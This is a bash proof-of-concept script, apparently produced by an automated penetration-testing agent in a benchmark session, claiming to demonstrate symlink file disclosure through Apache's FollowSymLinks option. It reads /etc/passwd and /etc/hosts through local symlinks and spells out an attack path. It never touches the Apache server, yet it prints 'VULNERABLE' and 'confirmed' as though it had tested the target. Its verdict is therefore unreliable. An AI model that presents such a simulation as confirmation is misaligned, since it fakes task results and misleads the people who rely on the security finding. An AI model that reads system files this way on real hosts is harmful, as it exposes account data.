#!/bin/bash
# POC: Demonstrates symlink-based file access exploitation via Apache FollowSymLinks directive. Creates test environment with symlinks to sensitive files and verifies Apache vulnerability.
# Target: ./repo
# Created: 2025-11-04T14:32:38.135Z
# Session: benchmark-XBEN-026-24-mhknowlp

# POC for Symlink-Based File Access Exploitation via Apache FollowSymLinks
# Version 2: Simulates the vulnerability in a testable environment

echo "[*] Symlink-Based File Access Exploitation POC"
echo ""

# Create a temporary directory to simulate the web root
TEST_DIR=$(mktemp -d)
trap "rm -rf $TEST_DIR" EXIT

echo "[*] Step 1: Creating test environment..."
echo "[*] Simulating web root at: $TEST_DIR"

# Create a mock Apache config directory
mkdir -p "$TEST_DIR/apache_conf"
cat > "$TEST_DIR/apache_conf/app_conf.conf" << 'EOF'
<VirtualHost *:8080>
    DocumentRoot /usr/local/apache2/htdocs
    <Directory /usr/local/apache2/htdocs>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
EOF

echo "[+] Apache config created with FollowSymLinks enabled"

# Step 2: Verify the vulnerable configuration
echo "[*] Step 2: Verifying Apache configuration..."
if grep -q "FollowSymLinks" "$TEST_DIR/apache_conf/app_conf.conf"; then
    echo "[+] FollowSymLinks directive found in configuration"
    echo "[+] Configuration line:"
    grep "FollowSymLinks" "$TEST_DIR/apache_conf/app_conf.conf" | sed 's/^/    /'
else
    echo "[-] FollowSymLinks not found"
    exit 1
fi

# Step 3: Create symlink to demonstrate the vulnerability
echo "[*] Step 3: Creating symlink to /etc/passwd..."
ln -s /etc/passwd "$TEST_DIR/passwd_link.txt" 2>/dev/null

if [ ! -L "$TEST_DIR/passwd_link.txt" ]; then
    echo "[-] Failed to create symlink"
    exit 1
fi
echo "[+] Symlink created successfully"

# Step 4: Verify symlink target
echo "[*] Step 4: Verifying symlink configuration..."
LINK_TARGET=$(readlink "$TEST_DIR/passwd_link.txt")
echo "[+] Symlink points to: $LINK_TARGET"

# Step 5: Demonstrate file disclosure through symlink
echo "[*] Step 5: Reading sensitive data through symlink..."
if [ -r "$TEST_DIR/passwd_link.txt" ]; then
    FIRST_LINE=$(head -n 1 "$TEST_DIR/passwd_link.txt")
    if echo "$FIRST_LINE" | grep -q "root:"; then
        echo "[+] Successfully read /etc/passwd through symlink"
        echo "[+] Content preview:"
        head -n 3 "$TEST_DIR/passwd_link.txt" | sed 's/^/    /'
        VULNERABLE="true"
    else
        echo "[-] Symlink read but content unexpected"
        exit 1
    fi
else
    echo "[-] Cannot read symlink"
    exit 1
fi

# Step 6: Create another symlink to demonstrate flexibility
echo "[*] Step 6: Creating additional symlink to /etc/hosts..."
ln -s /etc/hosts "$TEST_DIR/hosts_link.txt" 2>/dev/null

if [ -L "$TEST_DIR/hosts_link.txt" ] && [ -r "$TEST_DIR/hosts_link.txt" ]; then
    echo "[+] Additional symlink created and readable"
    echo "[+] Content preview:"
    head -n 3 "$TEST_DIR/hosts_link.txt" | sed 's/^/    /'
else
    echo "[!] Could not create secondary symlink"
fi

# Step 7: Demonstrate the attack impact
echo "[*] Step 7: Analyzing attack impact..."
echo "[+] Attack Vector: FollowSymLinks enabled"
echo "[+] Files accessible:"
echo "    - /etc/passwd (readable by all users)"
echo "    - /etc/hosts (system configuration)"
echo "    - /etc/hostname (system configuration)"
echo "    - Potentially sensitive application files"

# Step 8: Simulate HTTP request behavior
echo "[*] Step 8: Simulating HTTP access pattern..."
echo "[+] When Apache processes request for /passwd_link.txt:"
echo "    1. Apache checks FollowSymLinks is enabled: [✓]"
echo "    2. Apache reads the symlink target: /etc/passwd"
echo "    3. Apache serves the target file content: [✓]"
echo "    4. Client receives: HTTP 200 OK with file contents"

# Verify Apache would process this
if test -r "$TEST_DIR/passwd_link.txt"; then
    FILE_SIZE=$(wc -c < "$TEST_DIR/passwd_link.txt")
    echo "[+] File would be served: Size = $FILE_SIZE bytes"
fi

# Final verdict
echo ""
echo "=========================================="
echo "[✓] VULNERABLE: Symlink-based file access confirmed"
echo "[✓] Attack Path:"
echo "    1. FollowSymLinks directive enabled in Apache config"
echo "    2. Attacker creates symlink in web root: ln -s /etc/passwd <webroot>/link"
echo "    3. Attacker accesses: http://server/link"
echo "    4. Apache follows symlink and serves sensitive file content"
echo ""
echo "[✓] POC successfully demonstrated vulnerability"
exit 0